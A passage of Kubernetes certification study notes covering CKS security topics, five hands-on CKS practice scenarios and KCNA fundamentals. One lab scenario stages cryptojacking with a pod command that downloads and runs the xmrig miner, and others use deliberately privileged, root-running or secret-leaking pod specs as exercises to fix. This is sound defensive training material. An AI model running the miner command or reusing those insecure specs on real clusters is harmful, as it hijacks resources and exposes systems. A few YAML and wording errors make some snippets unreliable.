<li>An alert is produced when a rule matches a specific event</li>
<li>Alerts are then sent to an output channel to record the event</li>
</ul>
</li>
</ul>
<h2 id="ensuring-container-immutability"><a class="header" href="#ensuring-container-immutability">Ensuring Container Immutability</a></h2>
<ul>
<li>Containers should be immutable. This means that once a container is created, it should not be changed. If changes are needed, a new container should be created.</li>
<li>Containers are mutable (changeable) by default. This can lead to security vulnerabilities.</li>
<li>To ensure container immutability:
<ul>
<li>Use a ‚Äòdistroless‚Äô container image. These images are minimal and contain only the necessary components to run an application. They do not include a shell.</li>
<li>Use a ‚Äòread-only‚Äô file system. This prevents changes to the file system. To configure a read-only file system, add the following to the pod spec:
<pre><code>spec:
  containers:
  - name: my-container
    image: my-image
    securityContext:
      readOnlyRootFilesystem: true
</code></pre>
</li>
</ul>
</li>
</ul>
<h2 id="audit-logs"><a class="header" href="#audit-logs">Audit Logs</a></h2>
<ul>
<li>Auditing involves recording and tracking all events and actions within the cluster</li>
<li>Who made a change, when was it changed, and what exactly was changed</li>
<li>Audit logs provide a chronological record of activities within a cluster</li>
<li>Entries in the audit log exist in ‚ÄòJSON Lines‚Äô format. Note that this is not the same as JSON. Each line in the log is a separate JSON object.</li>
<li>Types of Audit Policies:
<ul>
<li>None - no logging</li>
<li>Metadata - Logs request metadata, but not request or response body</li>
<li>Request - Logs request metadata and request body, but no response body</li>
<li>Request/Response - Logs the metadata, request body, and response body</li>
</ul>
</li>
</ul>
<h3 id="sample-audit-policy"><a class="header" href="#sample-audit-policy">Sample Audit Policy</a></h3>
<pre><code>```
apiVersion: audit.k8s.io/v1 # This is required.
kind: Policy
omitStages:
  - "RequestReceived"
rules:
  # Log pod changes at RequestResponse level
  - level: RequestResponse
    resources:
    - group: ""
      # Resource "pods" doesn't match requests to any subresource of pods,
      # which is consistent with the RBAC policy.
      resources: ["pods"]
  # Log "pods/log", "pods/status" at Metadata level
  - level: Metadata
    resources:
    - group: ""
      resources: ["pods/log", "pods/status"]

  # Don't log requests to a configmap called "controller-leader"
  - level: None
    resources:
    - group: ""
      resources: ["configmaps"]
      resourceNames: ["controller-leader"]

  # Don't log watch requests by the "system:kube-proxy" on endpoints or services
  - level: None
    users: ["system:kube-proxy"]
    verbs: ["watch"]
    resources:
    - group: "" # core API group
      resources: ["endpoints", "services"]

  # Don't log authenticated requests to certain non-resource URL paths.
  - level: None
    userGroups: ["system:authenticated"]
    nonResourceURLs:
    - "/api*" # Wildcard matching.
    - "/version"

  # Log the request body of configmap changes in kube-system.
  - level: Request
    resources:
    - group: "" # core API group
      resources: ["configmaps"]
    # This rule only applies to resources in the "kube-system" namespace.
    # The empty string "" can be used to select non-namespaced resources.
    namespaces: ["kube-system"]

  # Log configmap and secret changes in all other namespaces at the Metadata level.
  - level: Metadata
    resources:
    - group: "" # core API group
      resources: ["secrets", "configmaps"]

  # Log all other resources in core and extensions at the Request level.
  - level: Request
    resources:
    - group: "" # core API group
    - group: "extensions" # Version of group should NOT be included.

  # A catch-all rule to log all other requests at the Metadata level.
  - level: Metadata
    # Long-running requests like watches that fall under this rule will not
    # generate an audit event in RequestReceived.
    omitStages:
      - "RequestReceived"
```
</code></pre>
<ul>
<li>Once the audit policy has been defined, you can apply it to the cluster by passing the <code>--audit-policy-file</code> flag to the kube-apiserver</li>
<li>To use a file-based log backend, you need to pass 3 configurations to the kube-apiserver:
<ul>
<li><code>--audit-policy-file</code> - this is the path to the audit policy file</li>
<li><code>--audit-log-path</code> - this is the path to the audit log file</li>
<li>both of these paths needs to be mounted in the kube-apiserver. The kube-apiserver cannot read these files on the node without a proper <code>volumeMount</code></li>
</ul>
</li>
</ul>
</h4>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kubernetes-security-specialist-cks-practice-scenarios"><a class="header" href="#kubernetes-security-specialist-cks-practice-scenarios">Kubernetes Security Specialist (CKS) Practice Scenarios</a></h1>
<h2 id="scenario-1-prevent-privilege-escalation"><a class="header" href="#scenario-1-prevent-privilege-escalation">Scenario 1: Prevent Privilege Escalation</a></h2>
<p><strong>Objective</strong>: Ensure a pod cannot escalate privileges or run as root.</p>
<h3 id="problem-statement"><a class="header" href="#problem-statement">Problem Statement:</a></h3>
<p>You have been given a pod specification that allows a container to run as root. Your task is to:</p>
<ol>
<li>Modify the pod spec to ensure it runs as a non-root user.</li>
<li>Apply a <strong>PodSecurityPolicy</strong> (if using older versions) or <strong>Pod Security Admission</strong> (PSA) to enforce this restriction.</li>
</ol>
<p>Pod spec to modify:</p>
<pre><code>cat &lt;&lt; EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: insecure-pod
  labels:
    app: insecure
spec:
  containers:
  - name: insecure-container
    image: busybox
    command: ["sleep", "3600"]
    securityContext:
      privileged: true  # Allows full access to the host (needs to be removed)
      runAsUser: 0      # Runs as root (needs to be changed)
      capabilities:
        add: ["NET_ADMIN", "SYS_ADMIN"]  # Grants unnecessary capabilities
EOF
</code></pre>
<details>
<summary>üí° Hints</summary>
<ul>
<li>Use <code>securityContext.runAsNonRoot: true</code></li>
<li>Use <code>securityContext.capabilities.drop: ["ALL"]</code></li>
<li>If using <strong>PSA</strong>, enforce the <code>restricted</code> profile.</li>
</ul>
</details>
<h3 id="expected-outcome"><a class="header" href="#expected-outcome">Expected Outcome:</a></h3>
<ul>
<li>The pod should not run as root.</li>
<li>Any attempt to run a root-level container should be denied.</li>
</ul>
<hr>
<h2 id="scenario-2-detect-and-mitigate-a-cryptojacking-attack"><a class="header" href="#scenario-2-detect-and-mitigate-a-cryptojacking-attack">Scenario 2: Detect and Mitigate a Cryptojacking Attack</a></h2>
<p><strong>Objective</strong>: Identify and remove a malicious pod mining cryptocurrency.</p>
<h3 id="problem-statement-1"><a class="header" href="#problem-statement-1">Problem Statement:</a></h3>
<p>A newly deployed pod has been consuming a high amount of CPU resources without any declared resource limits. Upon investigation, it appears to be running a cryptomining process (<code>xmrig</code>). Your tasks:</p>
<ol>
<li>Identify the pod consuming excessive CPU.</li>
<li>Inspect the container and confirm it is mining cryptocurrency.</li>
<li>Mitigate the issue by removing the pod and applying security policies to prevent future attacks.</li>
</ol>
<p>Deploy a malicious pod:</p>
<pre><code>cat &lt;&lt; EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: cryptominer
  labels:
    app: cryptominer
spec:
  containers:
  - name: cryptominer-container
    image: ubuntu
    command: ["/bin/sh", "-c", "apt update &amp;&amp; apt install -y curl &amp;&amp; curl -sL https://github.com/xmrig/xmrig/releases/latest/download/xmrig -o /usr/local/bin/xmrig &amp;&amp; chmod +x /usr/local/bin/xmrig &amp;&amp; /usr/local/bin/xmrig"]
    resources:
      requests:
        cpu: "500m"
      limits:
        cpu: "2000m"
EOF
</code></pre>
<details>
<summary>üí° Hints</summary>
<ul>
<li>Use <code>kubectl top pod --sort-by=cpu</code> to find high CPU-consuming pods.</li>
<li>Use <code>kubectl exec -it &lt;pod&gt; -- ps aux</code> to check running processes.</li>
<li>Consider <strong>Network Policies</strong> to restrict outbound traffic.</li>
<li>Apply <strong>ResourceQuotas</strong> and <strong>LimitRanges</strong> to prevent overuse.</li>
</ul>
</details>
<h3 id="expected-outcome-1"><a class="header" href="#expected-outcome-1">Expected Outcome:</a></h3>
<ul>
<li>The malicious pod should be deleted.</li>
<li>Future unauthorized mining activities should be restricted using security policies.</li>
</ul>
<hr>
<h2 id="scenario-3-restrict-container-networking"><a class="header" href="#scenario-3-restrict-container-networking">Scenario 3: Restrict Container Networking</a></h2>
<p><strong>Objective</strong>: Implement a network policy to isolate an application from unauthorized access.</p>
<h3 id="problem-statement-2"><a class="header" href="#problem-statement-2">Problem Statement:</a></h3>
<p>Your application pod (<code>web-app</code>) should only communicate with the database (<code>db</code>) pod. Other pods should not be able to access <code>web-app</code>. Implement a <strong>NetworkPolicy</strong> to enforce this restriction.</p>
<pre><code>cat &lt;&lt; EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: web-app
  labels:
    app: web-app
spec:
  containers:
  - name: web-container
    image: nginx
    ports:
    - containerPort: 80
---
apiVersion: v1
kind: Pod
metadata:
  name: db
  labels:
    app: db
spec:
  containers:
  - name: db-container
    image: mysql
    ports:
    - containerPort: 3306
--- 
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  labels:
    app: attacker
spec:
  containers:
  - name: attacker-container
    image: busybox
    command: ["sleep", "3600"]
EOF
</code></pre>
<details>
<summary>üí° Hints</summary>
<ul>
<li>Create a <code>NetworkPolicy</code> that allows traffic from <code>db</code> to <code>web-app</code>.</li>
<li>Deny all ingress traffic by default.</li>
<li>Use <code>kubectl run busybox --rm -it --image=busybox sh</code> to test connectivity.</li>
</ul>
</details>
<h3 id="expected-outcome-2"><a class="header" href="#expected-outcome-2">Expected Outcome:</a></h3>
<ul>
<li>Only <code>db</code> can communicate with <code>web-app</code>.</li>
<li>Any external pod trying to access <code>web-app</code> should be denied.</li>
</ul>
<hr>
<h2 id="scenario-4-protect-secrets-in-kubernetes"><a class="header" href="#scenario-4-protect-secrets-in-kubernetes">Scenario 4: Protect Secrets in Kubernetes</a></h2>
<p><strong>Objective</strong>: Ensure Kubernetes secrets are stored and accessed securely.</p>
<h3 id="problem-statement-3"><a class="header" href="#problem-statement-3">Problem Statement:</a></h3>
<p>An application pod is reading a Kubernetes secret (<code>db-password</code>). Your security audit revealed:</p>
<ol>
<li>The secret is mounted as a <strong>plain text environment variable</strong>.</li>
<li>Developers are retrieving secrets using <code>kubectl get secrets</code>.</li>
</ol>
<p>Your tasks:</p>
<ul>
<li>Modify the pod spec to <strong>mount the secret as a file</strong> instead of an environment variable.</li>
<li>Restrict access to secrets by applying <strong>RBAC policies</strong>.</li>
</ul>
<pre><code>cat &lt;&lt; EOF | kubectl create -f -
apiVersion: v1
kind: Secret
metadata:
  name: db-secret
type: Opaque
data:
  username: dXNlcg==  # Base64 encoded "user"
  password: c2VjdXJlcGFzcw==  # Base64 encoded "securepass"
---
apiVersion: v1
kind: Pod
metadata:
  name: insecure-pod
spec:
  containers:
  - name: app-container
    image: busybox
    command: [ "sh", "-c", "env | grep DB_" ]
    env:
    - name: DB_USERNAME
      valueFrom:
        secretKeyRef:
          name: db-secret
          key: username
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-secret
          key: password
EOF
</code></pre>
<details>
<summary>üí° Hints</summary>
<ul>
<li>Use <code>volumeMounts</code> and <code>volumes</code> instead of <code>env</code>.</li>
<li>Implement <strong>RBAC</strong> to restrict access to <code>kubectl get secrets</code>.</li>
</ul>
</details>
<h3 id="expected-outcome-3"><a class="header" href="#expected-outcome-3">Expected Outcome:</a></h3>
<ul>
<li>The application still retrieves the secret, but in a more secure manner.</li>
<li>Unauthorized users cannot list secrets.</li>
</ul>
<hr>
<h2 id="scenario-5-detect-and-block-unauthorized-container-images"><a class="header" href="#scenario-5-detect-and-block-unauthorized-container-images">Scenario 5: Detect and Block Unauthorized Container Images</a></h2>
<p><strong>Objective</strong>: Restrict pod deployments to approved images only.</p>
<h3 id="problem-statement-4"><a class="header" href="#problem-statement-4">Problem Statement:</a></h3>
<p>A developer accidentally deployed an image from Docker Hub (<code>nginx:latest</code>) instead of using the company‚Äôs private registry (<code>registry.example.com/nginx:latest</code>). You need to:</p>
<ol>
<li>Detect and delete unauthorized images.</li>
<li>Implement Gatekeeper to enforce image restrictions.</li>
</ol>
<p>Steps:</p>
<ol>
<li>Deploy Gatekeeper</li>
</ol>
<pre><code>kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/v3.18.2/deploy/gatekeeper.yaml
</code></pre>
<ol start="2">
<li>
<p>Deploy a constraint template and constraint to restrict images:</p>
</li>
<li>
<p>Deploy non-compliant pod(s) and see the result:</p>
</li>
</ol>
<pre><code>cat &lt;&lt; EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: unauthorized-pod
  labels:
    app: unauthorized
spec:
  containers:
  - name: nginx-container
    image: nginx:latest
    ports:
    - containerPort: 80
EOF
</code></pre>
<details>
<summary>üí° Hints</summary>
<ul>
<li>Use <code>kubectl get pods -o jsonpath='{.items[*].spec.containers[*].image}'</code> to find all running images.</li>
<li>Install <strong>Gatekeeper</strong> with <strong>Open Policy Agent (OPA)</strong> to enforce policies.</li>
</ul>
</details>
<h3 id="expected-outcome-4"><a class="header" href="#expected-outcome-4">Expected Outcome:</a></h3>
<ul>
<li>Unauthorized images should be flagged and removed.</li>
<li>Only images from <code>whatever.registry.com</code> should be allowed.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kcna"><a class="header" href="#kcna">KCNA</a></h1>
<h2 id="directory-map-15"><a class="header" href="#directory-map-15">Directory Map</a></h2>
<ul>
<li><a href="#kubernetes-certified-native-associate-kcna-notes">notes</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kubernetes-certified-native-associate-kcna-notes"><a class="header" href="#kubernetes-certified-native-associate-kcna-notes">Kubernetes Certified Native Associate (KCNA) Notes</a></h1>
<p align="center"><img width="180" alt="portfolio_view" src="kubernetes/kcna/badge.png"></p>

<p align="center"><img width="300" alt="portfolio_view" src="kubernetes/kcna/kubernetes.png"></p>

<h4 align="center"><a href="https://www.cncf.io/certification/kcna/">https://www.cncf.io/certification/kcna/</a></h4>

<h1 align="center">Kubernetes Certified Native Associate (KCNA) Notes</h1>

<h2 id="table-of-contents-8"><a class="header" href="#table-of-contents-8">Table of Contents</a></h2>
<ul>
<li><a href="#exam-1">Exam</a>
<ul>
<li><a href="#outline-1">Outline</a></li>
<li><a href="#changes-1">Changes</a></li>
</ul>
</li>
<li><a href="#preparation-1">Preparation</a>
<ul>
<li><a href="#study-resources-1">Study Resources</a></li>
<li><a href="#practice-1">Practice</a></li>
</ul>
</li>
<li><a href="#kubernetes-fundamentals">Kubernetes Fundamentals</a>
<ul>
<li><a href="#pods">Pods</a></li>
<li><a href="#replicasets">ReplicaSets</a></li>
<li><a href="#deployments">Deployments</a></li>
<li><a href="#replicaset-vs-deployment">ReplicaSet vs Deployment</a></li>
<li><a href="#kubernetes-namespaces">Kubernetes Namespaces</a></li>
<li><a href="#imperative-vs-declarative">Imperative vs Declarative</a></li>
<li><a href="#scheduling">Scheduling</a></li>
<li><a href="#labels-and-selectors">Labels and Selectors</a></li>
<li><a href="#taints-and-tolerations">Taints and Tolerations</a></li>
<li><a href="#node-selectors">Node Selectors</a></li>
<li><a href="#node-affinity">Node Affinity</a></li>
<li><a href="#requests-and-limits">Requests and Limits</a></li>
<li><a href="#daemonsets">DaemonSets</a></li>
<li><a href="#static-pods">Static Pods</a></li>
<li><a href="#multiple-schedulers">Multiple Schedulers</a></li>
<li><a href="#authentication-3">Authentication</a></li>
<li><a href="#authorization-1">Authorization</a></li>
<li><a href="#api-groups">API Groups</a></li>
<li><a href="#role-based-access-control-rbac">Role-Based Access Control (RBAC)</a></li>
<li><a href="#service-accounts-1">Service Accounts</a></li>
</ul>
</li>
<li><a href="#container-orchestration">Container Orchestration</a>
<ul>
<li><a href="#cluster-networking">Cluster Networking</a></li>
<li><a href="#pod-networking">Pod Networking</a></li>
<li><a href="#cni">CNI</a></li>
<li><a href="#dns-1">DNS</a></li>
<li><a href="#ingress">Ingress</a></li>
<li><a href="#services">Services</a></li>
<li><a href="#sidecars">Sidecars</a></li>
<li><a href="#envoy">Envoy</a></li>
<li><a href="#storage">Storage</a></li>
</ul>
</li>
<li><a href="#cloud-native-architecture">Cloud Native Architecture</a>
<ul>
<li><a href="#autoscaling">Autoscaling</a></li>
<li><a href="#kubernetes-keps-and-sigs">Kubernetes KEPs and SIGs</a></li>
</ul>
</li>
<li><a href="#cloud-native-application-delivery">Cloud Native Application Delivery</a>
<ul>
<li><a href="#gitops">GitOps</a>
<ul>
<li><a href="#gitops-principles">GitOps Principles</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /code_chunk_output -->
<h1 id="exam-1"><a class="header" href="#exam-1">Exam</a></h1>
<h2 id="outline-1"><a class="header" href="#outline-1">Outline</a></h2>
<p>https://github.com/cncf/curriculum/blob/master/KCNA_Curriculum.pdf</p>
<h2 id="changes-1"><a class="header" href="#changes-1">Changes</a></h2>
<h1 id="preparation-1"><a class="header" href="#preparation-1">Preparation</a></h1>
<h2 id="study-resources-1"><a class="header" href="#study-resources-1">Study Resources</a></h2>
<p>https://learn.kodekloud.com/user/courses/kubernetes-and-cloud-native-associate-kcna
https://amazon.com/KCNA-Book-Kubernetes-Native-Associate/dp/1916585035</p>
<h2 id="practice-1"><a class="header" href="#practice-1">Practice</a></h2>
<p>https://learn.kodekloud.com/user/courses/kubernetes-and-cloud-native-associate-kcna
https://tutorialsdojo.com/kubernetes-and-cloud-native-associate-kcna-sample-exam-questions/</p>
<h1 id="kubernetes-fundamentals"><a class="header" href="#kubernetes-fundamentals">Kubernetes Fundamentals</a></h1>
<h2 id="pods"><a class="header" href="#pods">Pods</a></h2>
<ul>
<li>A pod is the smallest deployable unit in Kubernetes. A Pod represents a single instance of a running process in your cluster.</li>
<li>Pods deploy a container image on a Kubernetes cluster as a running instance of an application.</li>
<li>A pod can contain more than one container.
<ul>
<li>An example use case would be a pod that contains a web server and a sidecar container that collects logs for the web server container.</li>
</ul>
</li>
<li>A pod can be deployed by using kubectl or by creating a YAML manifest:
<ul>
<li>Kubectl example:</li>
</ul>
<pre><code>kubectl run my-pod --image=my-image
</code></pre>
<ul>
<li>YAML manifest example:</li>
</ul>
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
- containers:
  - name: my-container
    image: my-image
</code></pre>
</li>
<li>You can view pods running in a cluster by using the following command:
<pre><code>kubectl get pods
</code></pre>
<ul>
<li>You can view detailed information about a pod by using the following command:</li>
</ul>
<pre><code>kubectl describe pod my-pod
</code></pre>
</li>
</ul>
<h2 id="replicasets"><a class="header" href="#replicasets">ReplicaSets</a></h2>
<ul>
<li>A ReplicaSet ensures that a specified number of pod replicas are running at any given time.</li>
<li>A ReplicaSet is defined by a YAML manifest that specifies the number of replicas to maintain.</li>
<li>A ReplicaSet can be deployed by creating a YAML manifest:
<ul>
<li>Kubectl example:</li>
</ul>
<pre><code>kubectl create -f my-replicaset.yaml
</code></pre>
</li>
<li>Replication Controllers are an older version of ReplicaSets and are being replaced.</li>
<li>You can view ReplicaSets running in a cluster by using the following command:
<pre><code>kubectl get replicaset
</code></pre>
<ul>
<li>You can view detailed information about a ReplicaSet by using the following command:</li>
</ul>
<pre><code>kubectl describe replicaset my-replicaset
</code></pre>
</li>
</ul>
<h2 id="deployments"><a class="header" href="#deployments">Deployments:</a></h2>
<ul>
<li>A Deployment is a higher-level concept that manages ReplicaSets and provides declarative updates to Pods along with a lot of other useful features.</li>
<li>A Deployment is defined by a YAML manifest that specifies the desired state of the deployment.</li>
<li>A Deployment can be deployed by creating a YAML manifest or imperatively using kubectl:
<ul>
<li>YAML example:</li>
</ul>
<pre><code>kubectl create -f my-deployment.yaml
</code></pre>
</li>
<li>You can view Deployments running in a cluster by using the following command:
<pre><code>kubectl get deployments
</code></pre>
</li>
<li>You can view detailed information about a Deployment by using the following command:
<pre><code>kubectl describe deployment my-deployment
</code></pre>
</li>
<li>Rolling updates can be performed on a Deployment by updating the Deployment‚Äôs YAML manifest and applying the changes:</li>
</ul>
<h2 id="replicaset-vs-deployment"><a class="header" href="#replicaset-vs-deployment">ReplicaSet vs Deployment:</a></h2>
<ul>
<li>ReplicaSets are a lower-level concept that manages Pods and ensures a specified number of pod replicas are running at any given time.</li>
<li>Deployments are a higher-level concept that manage ReplicaSets and provide declarative updates to Pods along with a lot of other useful features.</li>
</ul>
<h2 id="kubernetes-namespaces"><a class="header" href="#kubernetes-namespaces">Kubernetes Namespaces</a></h2>
<ul>
<li>Namespaces are a way to divide cluster resources between multiple users.</li>
<li>Namespaces can be used to organize resources and provide a way to scope resources.</li>
<li>Namespaces can be used to create resource quotas and limit the amount of resources a user can consume.</li>
<li>Namespaces can be used to create network policies and limit the network traffic between pods.</li>
<li>Namespaces can be used to create role-based access control (RBAC) policies and limit the permissions of users.</li>
</ul>
<h2 id="imperative-vs-declarative"><a class="header" href="#imperative-vs-declarative">Imperative vs Declarative</a></h2>
<ul>
<li>Imperative:
<ul>
<li>Imperative commands are used to perform a specific task.</li>
<li>An example of an imperative command would be to create a pod using kubectl run.</li>
<li>Imperative commands are useful for quick tasks and testing.</li>
</ul>
</li>
<li>Declarative:
<ul>
<li>Declarative commands are used to define the desired state of a resource.</li>
<li>An example of a declarative command would be to create a pod using a YAML manifest.</li>
<li>Declarative commands are useful for managing resources in a production environment.</li>
</ul>
</li>
</ul>
<h1 id="scheduling"><a class="header" href="#scheduling">Scheduling</a></h1>
<ul>
<li>Scheduling is the process of assigning pods to nodes in a Kubernetes cluster.</li>
<li>The Kubernetes scheduler is responsible for scheduling pods to nodes based on resource requirements and constraints.</li>
<li>The scheduler uses a set of policies to determine where to place pods in the cluster.</li>
<li>The scheduler can be configured to use different scheduling algorithms and policies.</li>
<li>The scheduler can be extended with custom scheduling plugins.</li>
<li>To schedule a pod, the scheduler evaluates the pod‚Äôs resource requirements, affinity and anti-affinity rules, taints and tolerations, and other constraints. It then selects a node that meets the requirements and assigns the pod to that node by updating the <code>spec.nodeName</code> field in the pod‚Äôs manifest.</li>
</ul>
<h2 id="labels-and-selectors"><a class="header" href="#labels-and-selectors">Labels and Selectors</a></h2>
<ul>
<li>Labels are key-value pairs that are attached to objects in Kubernetes.</li>
<li>Labels can be used to organize and select objects in Kubernetes.</li>
<li>Labels can be used to filter and group objects in Kubernetes.</li>
<li>Labels can be used to create selectors that match objects based on their labels.</li>
<li>Selectors are used to select objects in Kubernetes based on their labels.</li>
<li>Selectors can be used to filter objects based on their labels.</li>
<li>Selectors can be used to group objects based on their labels.</li>
<li>Selectors can be used to create sets of objects that match a specific label query.</li>
</ul>
<h2 id="taints-and-tolerations"><a class="header" href="#taints-and-tolerations">Taints and Tolerations</a></h2>
<ul>
<li>Taints are used to repel pods from nodes in a Kubernetes cluster.</li>
<li>We apply a taint to a node (as a key-value pair). Any pods that do not have a toleration for that taint will not be scheduled on that node.</li>
</ul>
<h2 id="node-selectors"><a class="header" href="#node-selectors">Node Selectors</a></h2>
<ul>
<li>Node selectors are used to constrain which nodes a pod is eligible to be scheduled based on labels on the node.</li>
<li>Node selectors are used to filter nodes based on their labels.</li>
<li>To use a node selector, you add a <code>nodeSelector</code> field to the pod‚Äôs spec that specifies a set of key-value pairs that must match the labels on the node.</li>
<li>Example:</li>
</ul>
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  containers:
  - name: my-container
    image: my-image
  nodeSelector:
    disktype: ssd
</code></pre>
<h2 id="node-affinity"><a class="header" href="#node-affinity">Node Affinity</a></h2>
<ul>
<li>Node affinity is a way to constrain which nodes a pod is eligible to be scheduled based on labels on the node.</li>
<li>Node affinity is similar to node selectors but provides more control over how pods are scheduled.</li>
<li>Node affinity can be used to specify required and preferred rules for node selection.</li>
<li>Node affinity can be used to specify rules that match or do not match nodes based on their labels.</li>
<li>Node affinity can be used to specify rules that match or do not match nodes based on their topology.</li>
<li>Example:</li>
</ul>
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  containers:
  - name: my-container
    image: my-image
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: disktype
            operator: In
            values:
            - ssd
</code></pre>
<h2 id="requests-and-limits"><a class="header" href="#requests-and-limits">Requests and Limits</a></h2>
<ul>
<li>Requests and limits are used to specify the amount of resources a pod requires and the maximum amount of resources a pod can consume.</li>
<li>Requests are used to specify the amount of resources a pod requires to run.</li>
<li>Limits are used to specify the maximum amount of resources a pod can consume.</li>
<li>Requests and limits can be specified for CPU and memory resources.</li>
<li>Requests and limits can be specified in the pod‚Äôs spec.</li>
<li>Example:</li>
</ul>
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  containers:
  - name: my-container
    image: my-image
    resources:
      requests:
        memory: "64Mi"
        cpu: "250m"
      limits:
        memory: "128Mi"
        cpu: "500m"
</code></pre>
<h2 id="daemonsets"><a class="header" href="#daemonsets">DaemonSets</a></h2>
<ul>
<li>DaemonSets are used to run a copy of a pod on all nodes in a Kubernetes cluster.</li>
<li>DaemonSets are used to run system daemons and other background tasks on all nodes.</li>
<li>DaemonSets are defined by a YAML manifest that specifies the pod template to use.</li>
<li>DaemonSets can be deployed by creating a YAML manifest:</li>
</ul>
<pre><code>apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: my-daemonset
spec:
  selector:
    matchLabels:
      app: my-daemonset
  template:
    metadata:
      labels:
        app: my-daemonset
    spec:
      containers:
      - name: my-container
        image: my-image
</code></pre>
<h2 id="static-pods"><a class="header" href="#static-pods">Static Pods</a></h2>
<ul>
<li>Static Pods are pods that are managed by the kubelet on a node.</li>
<li>Static Pods are defined by a file on the node‚Äôs filesystem.</li>
<li>Static Pods are not managed by the Kubernetes API server.</li>
<li>Static Pods are useful for running system daemons and other background tasks on a node.</li>
<li>Static Pods are defined by a file in the <code>/etc/kubernetes/manifests</code> directory on the node.</li>
<li>Static Pods are created and managed by the kubelet on the node.</li>
</ul>
<h2 id="multiple-schedulers"><a class="header" href="#multiple-schedulers">Multiple Schedulers</a></h2>
<ul>
<li>Kubernetes supports multiple schedulers that can be used to schedule pods in a cluster.</li>
<li>You can even create your own schedule and use it to schedule pods in a cluster.</li>
</ul>
<h2 id="authentication-3"><a class="header" href="#authentication-3">Authentication</a></h2>
<ul>
<li>Authentication is the process of verifying the identity of a user or system.</li>
<li>Kubernetes supports multiple authentication methods, including:
<ul>
<li>X.509 client certificates</li>
<li>Static tokens</li>
<li>Service accounts</li>
<li>OpenID Connect tokens</li>
<li>Webhook tokens</li>
</ul>
</li>
</ul>
<h2 id="authorization-1"><a class="header" href="#authorization-1">authorization</a></h2>
<ul>
<li>Authorization is the process of determining what actions a user or system is allowed to perform.</li>
<li>Kubernetes supports multiple authorization methods, including:
<ul>
<li>Role-based access control (RBAC)</li>
<li>Attribute-based access control (ABAC)</li>
</ul>
</li>
</ul>
<h2 id="api-groups"><a class="header" href="#api-groups">API Groups</a></h2>
<ul>
<li>API groups are used to organize resources in Kubernetes.</li>
<li>API groups are used to group related resources together.</li>
<li>API groups that you will commonly use:
<ul>
<li>core: Contains core resources like pods, services, and namespaces.</li>
<li>apps: Contains higher-level resources like deployments, replica sets, and stateful sets.</li>
<li>batch: Contains resources like jobs and cron jobs.</li>
<li>extensions: Contains deprecated resources like replica sets and daemon sets.</li>
<li>networking.k8s.io: Contains resources like network policies and ingresses.</li>
<li>storage.k8s.io: Contains resources like storage classes and persistent volume claims.</li>
<li>rbac.authorization.k8s.io: Contains resources like roles and role bindings.</li>
<li>metrics.k8s.io: Contains resources like pod metrics.</li>
<li>autoscaling: Contains resources like horizontal pod autoscalers.</li>
<li>admissionregistration.k8s.io: Contains resources like mutating webhooks and validating webhooks.</li>
</ul>
</li>
<li>Example:</li>
</ul>
<pre><code>curl -k https://&lt;master-ip&gt;:6443/apis/apps/v1
</code></pre>
<h2 id="role-based-access-control-rbac"><a class="header" href="#role-based-access-control-rbac">Role Based Access Control (RBAC)</a></h2>
<ul>
<li>Role-based access control (RBAC) is a method of restricting access to resources based on the roles of users or systems.</li>
</ul>
<h2 id="service-accounts-1"><a class="header" href="#service-accounts-1">Service Accounts</a></h2>
<ul>
<li>Service Accounts are created and managed by the Kubernetes API and can be used for machine authentication</li>
<li>To create a service account: <code>kubectl create serviceaccount &lt;account name&gt;</code></li>
<li>Service accounts are namespaced</li>
<li>When a service account is created, it has a token created automatically. The token is stored as a secret object.</li>
<li>You can also use the base64 encoded token to communicate with the Kube API Server:
<code>curl https://172.16.0.1:6443/api -insecure --header "Authorization: Bearer &lt;token value&gt;"</code></li>
<li>You can grant service accounts permission to the cluster itself by binding it to a role with a rolebinding. If a pod needs access to the cluster where it is hosted, you you configure the automountServiceAccountToken boolean parameter on the pod and assign it a service account that has the appropriate permissions to the cluster. The token will be mounted to the pods file system, where the value can then be accessed by the pod. The secret is mounted at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.</li>
<li>A service account named ‚Äòdefault‚Äô is automatically created in every namespace</li>
<li>As of kubernetes 1.22, tokens are automatically mounted to pods by an admission controller as a projected volume.
<ul>
<li>https://github.com/kubernetes/enhancements/blob/master/keps/sig-auth/1205-bound-service-account-tokens/README.md</li>
</ul>
</li>
<li>As of Kubernetes 1.24, when you create a service account, a secret is no longer created automatically for the token. Now you must run <code>kubectl create token &lt;service account name&gt;</code> to create the token.
<ul>
<li>https://github.com/kubernetes/enhancements/issues/2799</li>
</ul>
</li>
</ul>
<h1 id="container-orchestration"><a class="header" href="#container-orchestration">Container Orchestration</a></h1>
<h2 id="cluster-networking"><a class="header" href="#cluster-networking">Cluster Networking</a></h2>
<ul>
<li>A kubernetes cluster consists of master and worker nodes. Each node must have a network interface with a valid IP address configured. Each host must be connected to a network.</li>
<li>Certain TCP/UDP ports are required to be open:
<ul>
<li>6443/tcp</li>
<li>10250/tcp</li>
<li>10251/tcp</li>
<li>10252/tcp</li>
<li>2379/tcp</li>
<li>2380/tcp</li>
<li>30000-32767/tcp</li>
</ul>
</li>
</ul>
<h2 id="pod-networking"><a class="header" href="#pod-networking">Pod Networking</a></h2>
<ul>
<li>Every requires an IP address</li>
<li>Every pod in the cluster should be able to reach every other pod without using NAT</li>
</ul>
<h2 id="cni"><a class="header" href="#cni">CNI</a></h2>
<ul>
<li>Container Network Interface</li>
